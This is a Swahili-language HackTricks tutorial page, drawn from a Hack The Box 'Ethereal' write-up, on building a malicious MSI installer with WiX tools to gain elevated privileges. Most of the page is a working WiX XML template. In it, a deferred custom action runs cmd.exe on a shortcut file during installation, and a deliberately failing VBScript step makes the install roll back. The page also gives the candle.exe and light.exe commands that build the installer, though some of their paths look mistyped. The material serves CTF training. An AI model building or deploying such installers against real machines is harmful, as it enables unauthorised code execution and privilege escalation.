{{#include ../../banners/hacktricks-training.md}}

# Kuunda MSI Mbaya na Kupata Mzizi

Uundaji wa msanidi wa MSI utafanywa kwa kutumia wixtools, haswa [wixtools](http://wixtoolset.org) itatumika. Inafaa kutaja kwamba waandishi wengine wa MSI walijaribiwa, lakini hawakuwa na mafanikio katika kesi hii maalum.

Kwa ufahamu wa kina wa mifano ya matumizi ya wix MSI, ni vyema kushauriana na [ukurasa huu](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Hapa, unaweza kupata mifano mbalimbali inayoonyesha matumizi ya wix MSI.

Lengo ni kuzalisha MSI ambayo itatekeleza faili ya lnk. Ili kufanikisha hili, msimbo wa XML ufuatao unaweza kutumika ([xml kutoka hapa](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)):
```markup
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
Ni muhimu kutambua kwamba kipengele cha Package kina sifa kama InstallerVersion na Compressed, zinazoelezea toleo la minstall na kuashiria ikiwa kifurushi kimepandwa au la, mtawalia.

Mchakato wa uundaji unahusisha kutumia candle.exe, chombo kutoka wixtools, kutengeneza wixobject kutoka msi.xml. Amri ifuatayo inapaswa kutekelezwa:
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
Zaidi ya hayo, inafaa kutaja kwamba picha imetolewa katika chapisho, ambayo inaonyesha amri na matokeo yake. Unaweza kuirejelea kwa mwongozo wa kuona.

Zaidi ya hayo, light.exe, chombo kingine kutoka wixtools, kitatumika kuunda faili ya MSI kutoka wixobject. Amri itakayotekelezwa ni kama ifuatavyo:
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
Kama ilivyo kwa amri ya awali, picha imejumuishwa katika chapisho ikionyesha amri na matokeo yake.

Tafadhali kumbuka kwamba ingawa muhtasari huu unalenga kutoa taarifa muhimu, inapendekezwa kurejelea chapisho la asili kwa maelezo zaidi na maagizo sahihi.

## Marejeleo

- [https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)
[wixtools](http://wixtoolset.org)

{{#include ../../banners/hacktricks-training.md}}
